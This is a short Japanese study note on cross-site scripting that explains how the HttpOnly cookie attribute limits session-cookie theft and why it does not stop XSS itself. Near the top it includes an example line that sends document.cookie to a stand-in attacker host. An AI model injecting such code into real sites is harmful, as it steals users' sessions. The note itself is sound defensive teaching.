---
tags:
  - web
  - security
  - xss
created: 2026-01-04
status: active
---

# XSS(Xross-Site-Scripting)

[**XSS攻撃とは？**](#2ae38cdd-027d-804e-9371-e70f86526159)

[(対策) **HttpOnly属性 - XSS攻撃からの保護**](#2ae38cdd-027d-8035-8367-ddf4dfdb5ed3)

[**HttpOnlyの効果**](#2ae38cdd-027d-802e-ae3c-f602f85c7eae)

[**重要な注意点**](#2ae38cdd-027d-80e5-b3e1-da400ae35c51)

# **XSS攻撃とは？**

XSS攻撃の多くは、セッションCookieの窃取を目的としています。攻撃者が悪意のあるJavaScriptをWebページに注入できた場合、通常のCookieは簡単に盗まれてしまいます [OWASP Foundation](https://owasp.org/www-community/HttpOnly)。

```JavaScript
// ❌ HttpOnlyがない場合、このような攻撃が可能
document.write('<img src="https://attacker.com/?cookie=' 
  + document.cookie + '" />');
```

# (対策) **HttpOnly属性 - XSS攻撃からの保護**

---

HttpOnly属性は、JavaScriptから`document.cookie` APIを通じてCookieにアクセスできないようにします。これにより、XSS（Cross-Site Scripting）攻撃でセッションCookieが盗まれるリスクを大幅に軽減します [OWASP Foundation](https://owasp.org/www-community/HttpOnly)[Security Boulevard](https://securityboulevard.com/2020/08/the-httponly-flag-protecting-cookies-against-xss/)。

### **HttpOnlyの効果**

```JavaScript
// バックエンド（Express.js）
res.cookie('session_id', sessionId, {
  httpOnly: true  // ✅ JavaScriptからアクセス不可
});

// フロントエンド
console.log(document.cookie); 
// → session_idは表示されない！
```

HttpOnly Cookieは、XSS攻撃を防ぐのではなく、XSS攻撃が発生した場合の影響を軽減します。具体的には「セッショントークンの持ち出し（exfiltration）」を防ぎます [Clerk](https://clerk.com/blog/how-httponly-cookies-help-mitigate-xss-attacks)。

### **重要な注意点**

HttpOnlyフラグがあっても、XSS攻撃者は被害者のブラウザを通じて認証済みリクエストを送信できます。つまり、Cookieを盗めなくても、被害者になりすましてアクションを実行することは可能です [Shorebreaksecurity](https://www.shorebreaksecurity.com/blog/xss-exploitation-with-xhr-response-chaining/)[Stack Overflow](https://stackoverflow.com/questions/228138/is-it-possible-for-a-xss-attack-to-obtain-httponly-cookies)。

**結論**: HttpOnly Cookieは、攻撃者が自分のマシンから被害者のセッションを使い続けることを防ぎますが、XSS攻撃そのものを防ぐわけではありません [Clerk](https://clerk.com/blog/how-httponly-cookies-help-mitigate-xss-attacks)。